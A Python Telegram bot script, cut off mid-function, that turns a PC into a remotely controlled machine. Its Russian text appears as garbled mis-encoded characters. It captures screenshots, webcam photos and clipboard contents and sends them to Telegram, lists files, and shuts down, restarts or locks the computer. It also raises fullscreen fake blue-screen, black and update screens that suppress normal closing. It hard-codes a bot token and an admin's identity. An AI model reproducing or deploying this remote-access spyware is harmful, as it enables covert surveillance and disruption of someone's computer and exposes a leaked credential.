import os
import subprocess
import tempfile
import psutil
import pyautogui
import telebot
from telebot import types
from PIL import ImageGrab, ImageDraw
import time
import json
from datetime import datetime
import random
import requests
import webbrowser
import speech_recognition as sr
import pyttsx3
import wikipedia
import pyjokes
import cv2
import numpy as np
import keyboard as kb
import platform
import socket
import getpass
import pyperclip
import pywhatkit as kit
import qrcode
import speedtest
import tkinter as tk
import threading
import sys

# –ù–∞—Å—Ç—Ä–æ–π–∫–∏ –±–æ—Ç–∞ —Å –≤–∞—à–∏–º API –∫–ª—é—á–æ–º
BOT_TOKEN = '8453334672:AAE-BQX9Rl6GJ-kFs58j06VLVWPmMnp-oCI'
bot = telebot.TeleBot(BOT_TOKEN)

# –í–∞—à–∏ –¥–∞–Ω–Ω—ã–µ
YOUR_ADMIN_ID = 5606253168
YOUR_USERNAME = '@Sanya_HudasLove'

# –§–∞–π–ª –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è —Ä–∞–∑—Ä–µ—à–µ–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
ALLOWED_USERS_FILE = 'allowed_users.json'

# –ì–ª–æ–±–∞–ª—å–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –¥–ª—è —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –æ–∫–Ω–∞–º–∏
active_windows = {}


def load_allowed_users():
    """–ó–∞–≥—Ä—É–∂–∞–µ—Ç —Å–ø–∏—Å–æ–∫ —Ä–∞–∑—Ä–µ—à–µ–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π"""
    try:
        if os.path.exists(ALLOWED_USERS_FILE):
            with open(ALLOWED_USERS_FILE, 'r') as f:
                return json.load(f)
        return []
    except:
        return []


def save_allowed_users(users):
    """–°–æ—Ö—Ä–∞–Ω—è–µ—Ç —Å–ø–∏—Å–æ–∫ —Ä–∞–∑—Ä–µ—à–µ–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π"""
    with open(ALLOWED_USERS_FILE, 'w') as f:
        json.dump(users, f)


def is_user_allowed(user_id):
    """–ü—Ä–æ–≤–µ—Ä—è–µ—Ç, —Ä–∞–∑—Ä–µ—à–µ–Ω –ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å"""
    allowed_users = load_allowed_users()
    return user_id in allowed_users


# ==================== –§–ï–ô–ö–û–í–´–ï –≠–ö–†–ê–ù–´ ====================

def close_all_windows():
    """–ó–∞–∫—Ä—ã–≤–∞–µ—Ç –≤—Å–µ –∞–∫—Ç–∏–≤–Ω—ã–µ —Ñ–µ–π–∫–æ–≤—ã–µ –æ–∫–Ω–∞"""
    for window_id, window_info in list(active_windows.items()):
        try:
            if window_info['window'] and window_info['window'].winfo_exists():
                window_info['window'].destroy()
            del active_windows[window_id]
        except:
            continue


def fake_blue_screen(chat_id):
    """–°–æ–∑–¥–∞–µ—Ç —Ñ–µ–π–∫–æ–≤—ã–π —Å–∏–Ω–∏–π —ç–∫—Ä–∞–Ω —Å–º–µ—Ä—Ç–∏"""
    try:
        close_all_windows()

        root = tk.Tk()
        root.attributes('-fullscreen', True)
        root.configure(bg='#0078D7')
        root.attributes('-topmost', True)
        root.overrideredirect(True)

        # –£–±–∏—Ä–∞–µ–º —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–µ —Å–ø–æ—Å–æ–±—ã –∑–∞–∫—Ä—ã—Ç–∏—è
        root.protocol("WM_DELETE_WINDOW", lambda: None)

        window_id = f"bsod_{chat_id}"
        active_windows[window_id] = {'window': root, 'type': 'bsod'}

        text = """
üòà –§–ï–ô–ö–û–í–´–ô –°–ò–ù–ò–ô –≠–ö–†–ê–ù –°–ú–ï–†–¢–ò

–í–∞—à –∫–æ–º–ø—å—é—Ç–µ—Ä –≤—Å—Ç—Ä–µ—Ç–∏–ª—Å—è —Å –ø—Ä–æ–±–ª–µ–º–æ–π, –∏ –µ–≥–æ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å.
–ú—ã –ø—Ä–æ—Å—Ç–æ —Å–æ–±–∏—Ä–∞–µ–º –Ω–µ–∫–æ—Ç–æ—Ä—ã–µ –¥–∞–Ω–Ω—ã–µ –æ–± –æ—à–∏–±–∫–µ, –∞ –∑–∞—Ç–µ–º –ø—Ä–æ–∏–∑–≤–µ–¥–µ–º –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫—É.

(–ó–∞–≤–µ—Ä—à–µ–Ω–∏–µ 0%) 

–ï—Å–ª–∏ –≤—ã —Ö–æ—Ç–∏—Ç–µ —É–∑–Ω–∞—Ç—å –±–æ–ª—å—à–µ, –≤—ã –º–æ–∂–µ—Ç–µ –ø–æ–∏—Å–∫–∞—Ç—å –≤ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–µ –ø–æ–∑–∂–µ –≤–æ—Ç —Å —ç—Ç–∏–º –∫–æ–¥–æ–º –æ—à–∏–±–∫–∏: FAKE_BSOD_666

–î–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –ø–æ—Å–µ—Ç–∏—Ç–µ: https://t.me/Sanya_HudasLove

–¢–µ—Ö–Ω–∏—á–µ—Å–∫–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è:
*** STOP: 0x000000DEAD (0xFFFFFFFF, 0x00000000, 0x00000000, 0x00000000)

‚ö†Ô∏è –ß—Ç–æ–±—ã –∑–∞–∫—Ä—ã—Ç—å —ç—Ç–æ—Ç —ç–∫—Ä–∞–Ω, –Ω–∞–∂–º–∏—Ç–µ ESC
"""
        label = tk.Label(root, text=text, font=('Consolas', 14), fg='white', bg='#0078D7', justify='left')
        label.pack(expand=True)

        # –ö–Ω–æ–ø–∫–∞ –∑–∞–∫—Ä—ã—Ç–∏—è
        def close_window(e=None):
            root.destroy()
            if window_id in active_windows:
                del active_windows[window_id]
            bot.send_message(chat_id, "‚úÖ –°–∏–Ω–∏–π —ç–∫—Ä–∞–Ω –∑–∞–∫—Ä—ã—Ç")

        root.bind('<Escape>', close_window)

        # –ó–∞–ø—É—Å–∫–∞–µ–º –≤ –æ—Ç–¥–µ–ª—å–Ω–æ–º –ø–æ—Ç–æ–∫–µ
        def run_window():
            root.mainloop()

        thread = threading.Thread(target=run_window)
        thread.daemon = True
        thread.start()

        return True
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ —Å–∏–Ω–µ–≥–æ —ç–∫—Ä–∞–Ω–∞: {e}")
        return False


def fake_black_screen(chat_id):
    """–°–æ–∑–¥–∞–µ—Ç —Ñ–µ–π–∫–æ–≤—ã–π —á–µ—Ä–Ω—ã–π —ç–∫—Ä–∞–Ω"""
    try:
        close_all_windows()

        root = tk.Tk()
        root.attributes('-fullscreen', True)
        root.configure(bg='black')
        root.attributes('-topmost', True)
        root.overrideredirect(True)

        # –£–±–∏—Ä–∞–µ–º —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–µ —Å–ø–æ—Å–æ–±—ã –∑–∞–∫—Ä—ã—Ç–∏—è
        root.protocol("WM_DELETE_WINDOW", lambda: None)

        window_id = f"black_{chat_id}"
        active_windows[window_id] = {'window': root, 'type': 'black'}

        # –ú–∏–≥–∞—é—â–∏–π –∫—É—Ä—Å–æ—Ä
        cursor = tk.Label(root, text="_", font=('Consolas', 24), fg='green', bg='black')
        cursor.pack(expand=True)

        def blink():
            if cursor.cget('text') == "_":
                cursor.config(text=" ")
            else:
                cursor.config(text="_")
            if window_id in active_windows:
                root.after(500, blink)

        blink()

        # –§—É–Ω–∫—Ü–∏—è –∑–∞–∫—Ä—ã—Ç–∏—è
        def close_window(e=None):
            root.destroy()
            if window_id in active_windows:
                del active_windows[window_id]
            bot.send_message(chat_id, "‚úÖ –ß–µ—Ä–Ω—ã–π —ç–∫—Ä–∞–Ω –∑–∞–∫—Ä—ã—Ç")

        root.bind('<Escape>', close_window)

        # –ó–∞–ø—É—Å–∫–∞–µ–º –≤ –æ—Ç–¥–µ–ª—å–Ω–æ–º –ø–æ—Ç–æ–∫–µ
        def run_window():
            root.mainloop()

        thread = threading.Thread(target=run_window)
        thread.daemon = True
        thread.start()

        return True
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ —á–µ—Ä–Ω–æ–≥–æ —ç–∫—Ä–∞–Ω–∞: {e}")
        return False


def fake_error_message(chat_id):
    """–°–æ–∑–¥–∞–µ—Ç —Ñ–µ–π–∫–æ–≤–æ–µ –æ–∫–Ω–æ –æ—à–∏–±–∫–∏"""
    try:
        close_all_windows()

        root = tk.Toplevel()
        root.title("‚ùå –û—à–∏–±–∫–∞ —Å–∏—Å—Ç–µ–º—ã")
        root.geometry("400x250")
        root.attributes('-topmost', True)
        root.resizable(False, False)

        window_id = f"error_{chat_id}"
        active_windows[window_id] = {'window': root, 'type': 'error'}

        # –ò–∫–æ–Ω–∫–∞ –æ—à–∏–±–∫–∏
        error_icon = tk.Label(root, text="‚ùå", font=('Arial', 24))
        error_icon.pack(pady=10)

        # –¢–µ–∫—Å—Ç –æ—à–∏–±–∫–∏
        error_text = tk.Label(root,
                              text="–ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞ —Å–∏—Å—Ç–µ–º—ã!\n\n–ù–µ —É–¥–∞–ª–æ—Å—å –≤—ã–ø–æ–ª–Ω–∏—Ç—å –æ–ø–µ—Ä–∞—Ü–∏—é.\n–ö–æ–¥ –æ—à–∏–±–∫–∏: 0xFAKE_ERROR\n\n–ù–∞–∂–º–∏—Ç–µ ESC –¥–ª—è –∑–∞–∫—Ä—ã—Ç–∏—è",
                              font=('Arial', 10))
        error_text.pack(pady=10)

        # –ö–Ω–æ–ø–∫–∞ (–Ω–µ–∞–∫—Ç–∏–≤–Ω–∞—è)
        ok_btn = tk.Button(root, text="OK (–Ω–∞–∂–º–∏ ESC)", command=lambda: None, width=15)
        ok_btn.pack(pady=10)

        # –§—É–Ω–∫—Ü–∏—è –∑–∞–∫—Ä—ã—Ç–∏—è
        def close_window(e=None):
            root.destroy()
            if window_id in active_windows:
                del active_windows[window_id]
            bot.send_message(chat_id, "‚úÖ –û–∫–Ω–æ –æ—à–∏–±–∫–∏ –∑–∞–∫—Ä—ã—Ç–æ")

        root.bind('<Escape>', close_window)
        root.protocol("WM_DELETE_WINDOW", close_window)

        # –ó–∞–ø—É—Å–∫–∞–µ–º –≤ –æ—Ç–¥–µ–ª—å–Ω–æ–º –ø–æ—Ç–æ–∫–µ
        def run_window():
            root.mainloop()

        thread = threading.Thread(target=run_window)
        thread.daemon = True
        thread.start()

        return True
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ —Å–æ–∑–¥–∞–Ω–∏—è –æ—à–∏–±–∫–∏: {e}")
        return False


def fake_loading_screen(chat_id):
    """–§–µ–π–∫–æ–≤—ã–π —ç–∫—Ä–∞–Ω –∑–∞–≥—Ä—É–∑–∫–∏"""
    try:
        close_all_windows()

        root = tk.Tk()
        root.attributes('-fullscreen', True)
        root.configure(bg='black')
        root.attributes('-topmost', True)
        root.overrideredirect(True)

        window_id = f"loading_{chat_id}"
        active_windows[window_id] = {'window': root, 'type': 'loading'}

        # –õ–æ–≥–æ—Ç–∏–ø
        logo = tk.Label(root, text="‚ö°", font=('Arial', 48), fg='white', bg='black')
        logo.pack(pady=50)

        # –¢–µ–∫—Å—Ç –∑–∞–≥—Ä—É–∑–∫–∏
        loading_text = tk.Label(root, text="–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ —Å–∏—Å—Ç–µ–º—ã...\n\n–ù–∞–∂–º–∏—Ç–µ ESC –¥–ª—è –æ—Ç–º–µ–Ω—ã",
                                font=('Arial', 16), fg='white', bg='black')
        loading_text.pack()

        # –ü—Ä–æ–≥—Ä–µ—Å—Å –±–∞—Ä
        progress_frame = tk.Frame(root, bg='black')
        progress_frame.pack(pady=20)

        progress_bar = tk.Canvas(progress_frame, width=300, height=20, bg='black', highlightthickness=0)
        progress_bar.pack()

        progress = 0
        bar = progress_bar.create_rectangle(0, 0, 0, 20, fill='blue', outline='')

        def update_progress():
            nonlocal progress
            if progress < 100 and window_id in active_windows:
                progress += random.randint(1, 3)
                if progress > 100:
                    progress = 100

                progress_bar.coords(bar, 0, 0, progress * 3, 20)
                percent_label.config(text=f"{progress}%")
                root.after(200, update_progress)

        # –ü—Ä–æ—Ü–µ–Ω—Ç
        percent_label = tk.Label(root, text="0%", font=('Arial', 14), fg='white', bg='black')
        percent_label.pack()

        update_progress()

        # –§—É–Ω–∫—Ü–∏—è –∑–∞–∫—Ä—ã—Ç–∏—è
        def close_window(e=None):
            root.destroy()
            if window_id in active_windows:
                del active_windows[window_id]
            bot.send_message(chat_id, "‚úÖ –≠–∫—Ä–∞–Ω –∑–∞–≥—Ä—É–∑–∫–∏ –∑–∞–∫—Ä—ã—Ç")

        root.bind('<Escape>', close_window)

        # –ó–∞–ø—É—Å–∫–∞–µ–º –≤ –æ—Ç–¥–µ–ª—å–Ω–æ–º –ø–æ—Ç–æ–∫–µ
        def run_window():
            root.mainloop()

        thread = threading.Thread(target=run_window)
        thread.daemon = True
        thread.start()

        return True
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ —ç–∫—Ä–∞–Ω–∞ –∑–∞–≥—Ä—É–∑–∫–∏: {e}")
        return False


# ==================== –£–ü–†–ê–í–õ–ï–ù–ò–ï –û–ö–ù–ê–ú–ò ====================

@bot.message_handler(commands=['close'])
def close_windows_command(message):
    """–ó–∞–∫—Ä—ã–≤–∞–µ—Ç –≤—Å–µ –∞–∫—Ç–∏–≤–Ω—ã–µ —Ñ–µ–π–∫–æ–≤—ã–µ –æ–∫–Ω–∞"""
    if not is_user_allowed(message.from_user.id):
        return

    closed_count = 0
    for window_id in list(active_windows.keys()):
        try:
            window_info = active_windows[window_id]
            if window_info['window'] and window_info['window'].winfo_exists():
                window_info['window'].destroy()
            del active_windows[window_id]
            closed_count += 1
        except:
            continue

    if closed_count > 0:
        bot.send_message(message.chat.id, f"‚úÖ –ó–∞–∫—Ä—ã—Ç–æ {closed_count} –∞–∫—Ç–∏–≤–Ω—ã—Ö –æ–∫–æ–Ω")
    else:
        bot.send_message(message.chat.id, "‚ÑπÔ∏è –ù–µ—Ç –∞–∫—Ç–∏–≤–Ω—ã—Ö –æ–∫–æ–Ω –¥–ª—è –∑–∞–∫—Ä—ã—Ç–∏—è")


@bot.message_handler(commands=['status'])
def status_command(message):
    """–ü–æ–∫–∞–∑—ã–≤–∞–µ—Ç —Å—Ç–∞—Ç—É—Å –∞–∫—Ç–∏–≤–Ω—ã—Ö –æ–∫–æ–Ω"""
    if not is_user_allowed(message.from_user.id):
        return

    if active_windows:
        status_text = "üìä –ê–∫—Ç–∏–≤–Ω—ã–µ –æ–∫–Ω–∞:\n"
        for window_id, window_info in active_windows.items():
            status_text += f"‚Ä¢ {window_info['type']}\n"
        status_text += "\n–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ /close —á—Ç–æ–±—ã –∑–∞–∫—Ä—ã—Ç—å –≤—Å–µ"
    else:
        status_text = "‚ÑπÔ∏è –ù–µ—Ç –∞–∫—Ç–∏–≤–Ω—ã—Ö –æ–∫–æ–Ω"

    bot.send_message(message.chat.id, status_text)


# ==================== –ë–ê–ó–û–í–´–ï –§–£–ù–ö–¶–ò–ò ====================

def take_screenshot():
    """–î–µ–ª–∞–µ—Ç —Å–∫—Ä–∏–Ω—à–æ—Ç —ç–∫—Ä–∞–Ω–∞"""
    try:
        with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as tmp:
            screenshot = ImageGrab.grab()
            screenshot.save(tmp.name, 'PNG')
            return tmp.name
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏ —Å–∫—Ä–∏–Ω—à–æ—Ç–∞: {e}")
        return None


def take_webcam_photo():
    """–î–µ–ª–∞–µ—Ç —Ñ–æ—Ç–æ —Å –≤–µ–±–∫–∞–º–µ—Ä—ã"""
    try:
        cap = cv2.VideoCapture(0)
        if cap.isOpened():
            ret, frame = cap.read()
            cap.release()
            if ret:
                with tempfile.NamedTemporaryFile(suffix='.jpg', delete=False) as tmp:
                    cv2.imwrite(tmp.name, frame)
                    return tmp.name
        return None
    except:
        return None


def send_screenshot(chat_id):
    """–û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç —Å–∫—Ä–∏–Ω—à–æ—Ç –≤ Telegram"""
    try:
        screenshot_path = take_screenshot()
        if screenshot_path:
            with open(screenshot_path, 'rb') as photo:
                bot.send_photo(chat_id, photo, caption="üì∏ –°–∫—Ä–∏–Ω—à–æ—Ç —ç–∫—Ä–∞–Ω–∞")
            os.unlink(screenshot_path)
            return True
        bot.send_message(chat_id, "‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å —Å–¥–µ–ª–∞—Ç—å —Å–∫—Ä–∏–Ω—à–æ—Ç")
        return False
    except Exception as e:
        bot.send_message(chat_id, f"‚ùå –û—à–∏–±–∫–∞: {e}")
        return False


def send_webcam_photo(chat_id):
    """–û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç —Ñ–æ—Ç–æ —Å –≤–µ–±–∫–∞–º–µ—Ä—ã"""
    try:
        photo_path = take_webcam_photo()
        if photo_path:
            with open(photo_path, 'rb') as photo:
                bot.send_photo(chat_id, photo, caption="üì∑ –§–æ—Ç–æ —Å –≤–µ–±–∫–∞–º–µ—Ä—ã")
            os.unlink(photo_path)
            return True
        bot.send_message(chat_id, "‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å —Å–¥–µ–ª–∞—Ç—å —Ñ–æ—Ç–æ —Å –≤–µ–±–∫–∞–º–µ—Ä—ã")
        return False
    except Exception as e:
        bot.send_message(chat_id, f"‚ùå –û—à–∏–±–∫–∞ –≤–µ–±–∫–∞–º–µ—Ä—ã: {e}")
        return False


# –§—É–Ω–∫—Ü–∏–∏ —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è —Å–∏—Å—Ç–µ–º–æ–π
def shutdown_pc():
    try:
        if os.name == 'nt':
            os.system("shutdown /s /t 1")
        else:
            os.system("shutdown -h now")
        return True
    except:
        return False


def restart_pc():
    try:
        if os.name == 'nt':
            os.system("shutdown /r /t 1")
        else:
            os.system("reboot")
        return True
    except:
        return False


def lock_pc():
    try:
        if os.name == 'nt':
            os.system("rundll32.exe user32.dll,LockWorkStation")
        else:
            os.system("gnome-screensaver-command -l")
        return True
    except:
        return False


# ==================== –ò–ù–§–û–†–ú–ê–¶–ò–û–ù–ù–´–ï –§–£–ù–ö–¶–ò–ò ====================

def get_system_info():
    try:
        info = []
        info.append(f"üíª OS: {platform.platform()}")
        info.append(f"üêç Python: {platform.python_version()}")
        info.append(f"üöÄ CPU: {psutil.cpu_percent()}%")
        info.append(f"üß† RAM: {psutil.virtual_memory().percent}%")

        try:
            disk_usage = psutil.disk_usage('/')
            info.append(f"üíæ Disk: {disk_usage.percent}%")
        except:
            info.append("üíæ Disk: –ù–µ –¥–æ—Å—Ç—É–ø–Ω–æ")

        info.append(f"‚è∞ –í—Ä–µ–º—è: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        info.append(f"üë§ User: {getpass.getuser()}")

        return "\n".join(info)
    except Exception as e:
        return f"‚ùå –û—à–∏–±–∫–∞: {e}"


def get_weather(city="–ú–æ—Å–∫–≤–∞"):
    try:
        url = f"http://wttr.in/{city}?format=%c+%t+%w+%h"
        response = requests.get(url)
        return f"üå§ {city}: {response.text.strip()}"
    except:
        return "‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –ø–æ–≥–æ–¥—É"


def get_network_info():
    """–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Å–µ—Ç–∏"""
    try:
        info = []
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        info.append(f"üåê –•–æ—Å—Ç: {hostname}")
        info.append(f"üì° IP: {ip}")
        return "\n".join(info)
    except:
        return "‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å —Å–µ—Ç–µ–≤—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é"


# ==================== –†–ê–ó–í–õ–ï–ö–ê–¢–ï–õ–¨–ù–´–ï –§–£–ù–ö–¶–ò–ò ====================

def tell_joke():
    try:
        return pyjokes.get_joke(language='ru')
    except:
        return "–ü–æ—á–µ–º—É –ø—Ä–æ–≥—Ä–∞–º–º–∏—Å—Ç—ã —Ç–∞–∫–∏–µ –∫—Ä—É—Ç—ã–µ? –ü–æ—Ç–æ–º—É —á—Ç–æ –æ–Ω–∏ –≤—Å–µ–≥–¥–∞ debug-–∞—é—Ç –ø—Ä–æ–±–ª–µ–º—ã! üòÑ"


def random_fact():
    facts = [
        "–ó–Ω–∞–µ—à—å –ª–∏ —Ç—ã, —á—Ç–æ –ø–µ—Ä–≤—ã–π –∫–æ–º–ø—å—é—Ç–µ—Ä –≤–µ—Å–∏–ª –±–æ–ª–µ–µ 30 —Ç–æ–Ω–Ω?",
        "–°–∞–º—ã–π –±—ã—Å—Ç—Ä—ã–π —Å—É–ø–µ—Ä–∫–æ–º–ø—å—é—Ç–µ—Ä –¥–µ–ª–∞–µ—Ç 1 –∫–≤–∏–Ω—Ç–∏–ª–ª–∏–æ–Ω –æ–ø–µ—Ä–∞—Ü–∏–π –≤ —Å–µ–∫—É–Ω–¥—É!",
        "–ü–µ—Ä–≤—ã–π –∫–æ–º–ø—å—é—Ç–µ—Ä–Ω—ã–π –±–∞–≥ –±—ã–ª –Ω–∞—Å—Ç–æ—è—â–∏–º –º–æ—Ç—ã–ª—å–∫–æ–º –≤ 1947 –≥–æ–¥—É.",
    ]
    return random.choice(facts)


def magic_8ball():
    answers = [
        "–ë–µ—Å—Å–ø–æ—Ä–Ω–æ! ‚úÖ", "–ü—Ä–µ–¥—Ä–µ—à–µ–Ω–æ! ‚úÖ", "–ù–∏–∫–∞–∫–∏—Ö —Å–æ–º–Ω–µ–Ω–∏–π! ‚úÖ",
        "–û–ø—Ä–µ–¥–µ–ª—ë–Ω–Ω–æ –¥–∞! ‚úÖ", "–ú–Ω–µ –∫–∞–∂–µ—Ç—Å—è ‚Äî ¬´–¥–∞¬ª! ü§î",
        "–ü–æ–∫–∞ –Ω–µ —è—Å–Ω–æ, –ø–æ–ø—Ä–æ–±—É–π —Å–Ω–æ–≤–∞! üîÑ", "–°–ø—Ä–æ—Å–∏ –ø–æ–∑–∂–µ! ‚è∞",
        "–õ—É—á—à–µ –Ω–µ —Ä–∞—Å—Å–∫–∞–∑—ã–≤–∞—Ç—å! ü§´", "–î–∞–∂–µ –Ω–µ –¥—É–º–∞–π! ‚ùå"
    ]
    return random.choice(answers)


# ==================== –£–¢–ò–õ–ò–¢–´ ====================

def volume_up():
    try:
        if os.name == 'nt':
            import ctypes
            ctypes.windll.user32.keybd_event(0xAF, 0, 0, 0)
        return True
    except:
        return False


def volume_down():
    try:
        if os.name == 'nt':
            import ctypes
            ctypes.windll.user32.keybd_event(0xAE, 0, 0, 0)
        return True
    except:
        return False


def mute_volume():
    try:
        if os.name == 'nt':
            import ctypes
            ctypes.windll.user32.keybd_event(0xAD, 0, 0, 0)
        return True
    except:
        return False


def play_pause():
    try:
        kb.press_and_release('play/pause media')
        return True
    except:
        return False


def next_track():
    try:
        kb.press_and_release('next track')
        return True
    except:
        return False


def prev_track():
    try:
        kb.press_and_release('previous track')
        return True
    except:
        return False


def list_files(directory="."):
    try:
        files = os.listdir(directory)
        return "\n".join([f"üìÅ {f}" if os.path.isdir(os.path.join(directory, f)) else f"üìÑ {f}"
                          for f in files[:10]])
    except Exception as e:
        return f"‚ùå –û—à–∏–±–∫–∞: {e}"


def get_clipboard():
    """–ü–æ–ª—É—á–∏—Ç—å —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ –±—É—Ñ–µ—Ä–∞ –æ–±–º–µ–Ω–∞"""
    try:
        return pyperclip.paste()
    except:
        return "–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞"


# ==================== –ö–õ–ê–í–ò–ê–¢–£–†–ê ====================

def create_keyboard():
    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=3)

    keyboard.row('üì∏ –°–∫—Ä–∏–Ω—à–æ—Ç', 'üì∑ –í–µ–±–∫–∞–º–µ—Ä–∞', 'üìã –ò–Ω—Ñ–æ')
    keyboard.row('üîå –í—ã–∫–ª—é—á–∏—Ç—å', 'üîÑ –ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∞', 'üîí –ó–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å')
    keyboard.row('üéµ –ì—Ä–æ–º–∫–æ—Å—Ç—å +', 'üéµ –ì—Ä–æ–º–∫–æ—Å—Ç—å -', 'üîá Mute')
    keyboard.row('üìÅ –§–∞–π–ª—ã', 'üå§ –ü–æ–≥–æ–¥–∞', 'üåê –°–µ—Ç—å')
    keyboard.row('üéÆ –ò–≥—Ä—ã', 'üîÆ 8ball', 'üé≠ –®—É—Ç–∫–∞')
    keyboard.row('ü§î –§–∞–∫—Ç', 'üìã –ë—É—Ñ–µ—Ä', '‚ùì –ü–æ–º–æ—â—å')
    keyboard.row('üíô –°–∏–Ω–∏–π —ç–∫—Ä–∞–Ω', '‚ö´ –ß—ë—Ä–Ω—ã–π —ç–∫—Ä–∞–Ω', '‚ùå –û—à–∏–±–∫–∞')
    keyboard.row('üìä –ó–∞–≥—Ä—É–∑–∫–∞', 'üö´ –ó–∞–∫—Ä—ã—Ç—å –æ–∫–Ω–∞', 'üìä –°—Ç–∞—Ç—É—Å –æ–∫–æ–Ω')

    return keyboard


# ==================== –û–ë–†–ê–ë–û–¢–ß–ò–ö–ò –ö–û–ú–ê–ù–î ====================

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id

    if not is_user_allowed(user_id):
        bot.send_message(message.chat.id, "‚õî –î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â–µ–Ω. –û–±—Ä–∞—Ç–∏—Ç–µ—Å—å –∫ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—É.")
        return

    welcome_text = f"""
ü§ñ –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ –ú–ï–ì–ê-–ë–û–¢, {message.from_user.first_name}!

üëë –ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä: {YOUR_USERNAME}

‚ú® –ù–æ–≤—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏ - –§–µ–π–∫–æ–≤—ã–µ —ç–∫—Ä–∞–Ω—ã:
üíô –°–∏–Ω–∏–π —ç–∫—Ä–∞–Ω - –§–µ–π–∫–æ–≤—ã–π BSOD
‚ö´ –ß—ë—Ä–Ω—ã–π —ç–∫—Ä–∞–Ω - –ü—É—Å—Ç–æ–π —ç–∫—Ä–∞–Ω  
‚ùå –û—à–∏–±–∫–∞ - –û–∫–Ω–æ –æ—à–∏–±–∫–∏ Windows
üìä –ó–∞–≥—Ä—É–∑–∫–∞ - –≠–∫—Ä–∞–Ω –∑–∞–≥—Ä—É–∑–∫–∏

üéõ –ò—Å–ø–æ–ª—å–∑—É–π –∫–Ω–æ–ø–∫–∏ –Ω–∏–∂–µ!
"""

    bot.send_message(message.chat.id, welcome_text, reply_markup=create_keyboard())


# –û—Å–Ω–æ–≤–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã
@bot.message_handler(commands=['screenshot'])
def screenshot_command(message):
    if not is_user_allowed(message.from_user.id):
        return
    bot.send_message(message.chat.id, "üì∏ –î–µ–ª–∞—é —Å–∫—Ä–∏–Ω—à–æ—Ç...")
    send_screenshot(message.chat.id)


@bot.message_handler(commands=['webcam'])
def webcam_command(message):
    if not is_user_allowed(message.from_user.id):
        return
    bot.send_message(message.chat.id, "üì∑ –í–∫–ª—é—á–∞—é –≤–µ–±–∫–∞–º–µ—Ä—É...")
    send_webcam_photo(message.chat.id)


@bot.message_handler(commands=['shutdown'])
def shutdown_command(message):
    if not is_user_allowed(message.from_user.id):
        return
    if shutdown_pc():
        bot.send_message(message.chat.id, "üîå –ö–æ–º–ø—å—é—Ç–µ—Ä –≤—ã–∫–ª—é—á–∞–µ—Ç—Å—è...")
    else:
        bot.send_message(message.chat.id, "‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –≤—ã–∫–ª—é—á–∏—Ç—å –∫–æ–º–ø—å—é—Ç–µ—Ä")


@bot.message_handler(commands=['restart'])
def restart_command(message):
    if not is_user_allowed(message.from_user.id):
        return
    if restart_pc():
        bot.send_message(message.chat.id, "üîÑ –ö–æ–º–ø—å—é—Ç–µ—Ä –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∂–∞–µ—Ç—Å—è...")
    else:
        bot.send_message(message.chat.id, "‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å –∫–æ–º–ø—å—é—Ç–µ—Ä")


@bot.message_handler(commands=['lock'])
def lock_command(message):
    if not is_user_allowed(message.from_user.id):
        return
    if lock_pc():
